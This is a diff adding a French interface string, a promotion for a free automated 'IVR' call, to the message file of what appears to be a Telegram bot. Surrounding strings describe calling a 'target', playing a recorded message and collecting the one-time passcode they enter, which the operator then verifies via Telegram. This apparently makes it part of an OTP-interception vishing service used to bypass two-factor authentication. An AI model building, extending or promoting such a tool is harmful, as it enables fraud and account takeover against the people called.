@@ -1671,6 +1671,11 @@ captchaDomainButton: (domain, isOff, hasCF) => hasCF ? `${isOff ? '🔴 OFF' : '
  cp_73: (currentPh, value, nextPh) => `✅ ${currentPh}: <b>${value}</b>\n\nEnter value for <b>[${nextPh}]</b>:`,
  cp_74: '✅ Toutes les valeurs sont définies !\\n\\n📋 <b>Sélectionner le mode d\'appel</b>\\n\\n🔗 <b>Transfert</b> — Quand la cible appuie sur la touche, transfert vers votre numéro\\n🔑 <b>Collecte OTP</b> — Demander un code à la cible, vous vérifiez via Telegram\\n\\nLes deux modes fournissent des résultats complets.',
  cp_75: '🔗 <b>Mode Transfert</b>\\n\\nEntrez le numéro vers lequel transférer l\'appelant quand il appuie sur la touche active :\\n<i>(Votre numéro SIP ou tout numéro de téléphone)</i>\\n<i>Exemple : +33612345678</i>',
+ ivrTrialNudge: `🎁 <b>Vous avez 1 Appel IVR Rapide gratuit !</b>
+
+Passez un appel automatisé qui diffuse votre message enregistré et capture une touche ou un OTP — gratuit, sans forfait.
+
+👉 Appuyez sur <b>📞 Cloud IVR + SIP</b> ci-dessous, puis <b>📢 Appel IVR Rapide</b> pour l'essayer maintenant.`,
  cp_76: 'Veuillez entrer un numéro de transfert valide.',
  cp_77: '🔑 <b>OTP Collection Mode</b>\\n\\nHow many digits should the code be?\\n\\n<i>Default: 6 digits</i>',
  cp_78: 'Sélectionner a mode:',
